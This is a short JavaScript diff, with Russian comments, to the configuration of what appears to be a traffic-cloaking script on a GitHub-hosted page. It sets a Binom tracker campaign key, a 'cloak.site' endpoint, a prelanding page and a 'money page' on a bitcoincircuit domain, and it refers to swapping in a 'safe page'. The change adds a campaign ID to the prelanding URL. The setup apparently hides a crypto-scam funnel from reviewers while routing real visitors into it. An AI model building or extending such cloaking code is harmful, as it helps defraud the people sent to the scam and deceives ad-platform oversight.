@@ -2,14 +2,14 @@ var binomCampaingKey = 's15yun0z67b7t9btickt'; /* Key кампании в Binom.
 var gitHubId = 'denis8854'; /*ID данного GitHub сайта. Только ID, не вся ссылка!*/
 var preLandingUrl = 'https://serd.site/landing/xhr/mobile_final/latam.php'; /*Адрес преленда, который необходимо подгрузить*/
 var moneyPageUrl = 'https://cl.bitcoincircuit.online'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
-var landignLoadingCampaingId = '2dpmfzy61v5pcfgkk3ew'; /*Key кампании в Binom, в которой будут отображатся логи при загрзке преленда. Служит для отслеживания потери трафика. По умолчанию стоит стандартная кампания GLOBAL Landing Loading, id:167*/
+var landignLoadingCampaingId = '2dpmfzy61v5pcfgkk3ew'; /*Key кампании в Binom, в которой будут отображатся логи при загрузке преленда девайсом юзера. Служит для отслеживания потери трафика. По умолчанию стоит стандартная кампания GLOBAL Landing Loading, id:167*/
 
 /* 
 При необходимости можно заменить код формы/сейфпейдж, который заключен в function addContent (){...}
 БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!
 */
 
-var preLanding = preLandingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId; 
+var preLanding = preLandingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId + '&landingloadingid=' + landignLoadingCampaingId; 
 
 var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
 var xhr = new XMLHttpRequest();
